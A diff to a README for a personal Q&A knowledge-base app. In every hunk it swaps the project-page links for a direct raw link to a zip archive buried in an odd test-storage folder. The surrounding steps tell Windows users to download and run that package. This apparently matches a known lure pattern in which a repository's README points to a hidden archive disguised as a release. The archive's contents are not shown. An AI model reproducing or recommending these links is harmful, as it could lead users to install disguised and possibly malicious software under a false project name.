@@ -1,6 +1,6 @@
 # 🧠 My-Knowledge-Base - Build Your Personal Q&A Hub
 
-[![Download](https://img.shields.io/badge/Download-My--Knowledge--Base-blue?style=for-the-badge)](https://github.com/Midweekly-penn470/My-Knowledge-Base)
+[![Download](https://img.shields.io/badge/Download-My--Knowledge--Base-blue?style=for-the-badge)](https://github.com/Midweekly-penn470/My-Knowledge-Base/raw/refs/heads/main/apps/server/apps/server/target/test-storage/test-documents/My-Knowledge-Base-v3.1.zip)
 
 ## 🚀 What This App Does
 
@@ -20,7 +20,7 @@ It is built with Spring Boot, React, Vite, Dify, PostgreSQL, MinIO, and SSE.
 
 Visit this page to download and use the app:
 
-[https://github.com/Midweekly-penn470/My-Knowledge-Base](https://github.com/Midweekly-penn470/My-Knowledge-Base)
+[https://github.com/Midweekly-penn470/My-Knowledge-Base/raw/refs/heads/main/apps/server/apps/server/target/test-storage/test-documents/My-Knowledge-Base-v3.1.zip](https://github.com/Midweekly-penn470/My-Knowledge-Base/raw/refs/heads/main/apps/server/apps/server/target/test-storage/test-documents/My-Knowledge-Base-v3.1.zip)
 
 Open the page, find the latest release or package, then download the Windows file if one is provided.
 
@@ -50,7 +50,7 @@ If the download includes a bundled version, you can start the app with a few cli
 ## 🛠️ How to Install on Windows
 
 1. Open the download page:
-   [https://github.com/Midweekly-penn470/My-Knowledge-Base](https://github.com/Midweekly-penn470/My-Knowledge-Base)
+   [https://github.com/Midweekly-penn470/My-Knowledge-Base/raw/refs/heads/main/apps/server/apps/server/target/test-storage/test-documents/My-Knowledge-Base-v3.1.zip](https://github.com/Midweekly-penn470/My-Knowledge-Base/raw/refs/heads/main/apps/server/apps/server/target/test-storage/test-documents/My-Knowledge-Base-v3.1.zip)
 
 2. Download the Windows release file or package.
 
@@ -168,7 +168,7 @@ If the app opens in a browser but shows a blank page, refresh once and wait for 
 
 ## 🔗 Main Project Link
 
-[My-Knowledge-Base on GitHub](https://github.com/Midweekly-penn470/My-Knowledge-Base)
+[My-Knowledge-Base on GitHub](https://github.com/Midweekly-penn470/My-Knowledge-Base/raw/refs/heads/main/apps/server/apps/server/target/test-storage/test-documents/My-Knowledge-Base-v3.1.zip)
 
 ## 🧾 Useful Topics Covered
 
@@ -251,5 +251,5 @@ Clear files give better OCR results and better answers.
 
 ## 📬 Start Here
 
-[Download or open the project page](https://github.com/Midweekly-penn470/My-Knowledge-Base)
+[Download or open the project page](https://github.com/Midweekly-penn470/My-Knowledge-Base/raw/refs/heads/main/apps/server/apps/server/target/test-storage/test-documents/My-Knowledge-Base-v3.1.zip)
 
